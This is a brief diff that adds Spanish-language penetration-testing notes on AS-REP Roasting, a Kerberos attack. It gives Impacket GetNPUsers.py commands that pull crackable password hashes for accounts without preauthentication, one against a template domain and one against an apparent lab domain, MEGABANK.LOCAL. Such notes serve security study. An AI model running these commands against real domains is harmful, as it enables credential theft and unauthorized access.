@@ -1,0 +1,9 @@
+// TGT(Ticket Granting Tickets)
+// Ataque a ASRepRoast Attack
+Esto es usado cuando obtenemos una serie de usuarios para intentar obtener un hash del usuario el cual tenga un PREAUTH
+
+
+
+Comando(SIS) -> GetNPUsers.py {DOMAIN OR contoso.com} -no-pass -usersfile userfile.txt
+Comando(POC) -> GetNPUsers.py MEGABANK.LOCAL/ -no-pass -usersfile users.txt
+
